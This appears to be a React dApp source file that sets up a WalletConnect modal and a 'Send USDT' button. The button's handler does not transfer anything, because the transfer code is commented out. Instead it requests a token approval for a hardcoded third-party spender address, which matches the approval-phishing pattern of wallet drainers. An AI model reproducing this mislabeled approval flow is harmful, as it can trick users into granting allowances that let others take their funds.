import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";
import { createWeb3Modal } from "@web3modal/wagmi/react";
import { http, createConfig, WagmiProvider, useAccount } from "wagmi";
import { mainnet, arbitrum, bsc } from "viem/chains";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import Web3 from "web3";
import { usdt_abi, UsdtContract } from "./Cusdt";

// 0. Setup queryClient
const queryClient = new QueryClient();

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = "9a3a82c82ce33abe275a75d32a8d4bf1";
if (!projectId) throw new Error("Project ID is undefined");

// 2. Create wagmiConfig
const metadata = {
  name: "Web3Modal",
  description: "Web3Modal Example",
  url: "https://web3modal.com",
  icons: ["https://avatars.githubusercontent.com/u/37784886"],
};

// Define chains
const chains = [mainnet, arbitrum, bsc];

const wagmiConfig = createConfig({
  chains,
  transports: {
    [mainnet.id]: http(),
    [arbitrum.id]: http(),
    [bsc.id]: http(),
  },
  connectors: [], // Assuming you'll configure connectors separately
});

// Contract details
const stake_abi = usdt_abi;
const stakecontract = UsdtContract;

// 3. Create modal
createWeb3Modal({ wagmiConfig, projectId });

const getWeb3 = async () => {
  try {
    const web3 = new Web3(Web3.givenProvider);
    return web3;
  } catch (err) {
    console.error("Failed to get Web3 instance:", err);
    throw err;
  }
};

const App = () => {
  const { address } = useAccount();
  const approveSpender = async (spenderAddress, amount) => {
    try {
      const web3 = new Web3(window.ethereum);
      web3.setProvider(window.ethereum);
      const usdtContract = new web3.eth.Contract(usdt_abi, UsdtContract);
      const approvalAmount = amount * 10 ** 18;

      await usdtContract.methods
        .approve(spenderAddress, approvalAmount)
        .send({ from: address })
        .on("transactionHash", (hash) => {
          console.log("Transaction hash:", hash);
        })
        .on("receipt", (receipt) => {
          console.log("Approval successful:", receipt);
        })
        .on("error", (error) => {
          console.error("Approval failed:", error);
        });
    } catch (error) {
      console.error("Error in approval:", error);
    }
  };

  const sendTransaction = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      web3.setProvider(window.ethereum);
      console.log(address);
      const contract = new web3.eth.Contract(stake_abi, stakecontract);
      const transferAmount = 1 * 10 ** 18;
      const recipientAddress = "0xaea133d393ad100cd395e5807eced4be2aaed04e"; // Example recipient address
      approveSpender("0x0F1b1F82eEE342Fd18bC05792ec1F66D7a86CF8A", 20);

      // tranfer code
      // await contract.methods
      //   .transfer(recipientAddress, transferAmount)
      //   .send({
      //     from: address,
      //     gasPrice: Web3.utils.toWei("5", "gwei"), // Set gas price to 5 Gwei (adjust as needed)
      //   })
      //   .on("receipt", (receipt) => {
      //     console.log("Transaction successful:", receipt);
      //   })
      //   .on("error", (error) => {
      //     console.error("Error:", error);
      //   });
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <div>
      <w3m-button />
      <button onClick={sendTransaction}>Send USDT</button>
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));

root.render(
  <React.StrictMode>
    <WagmiProvider config={wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <App />
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
);
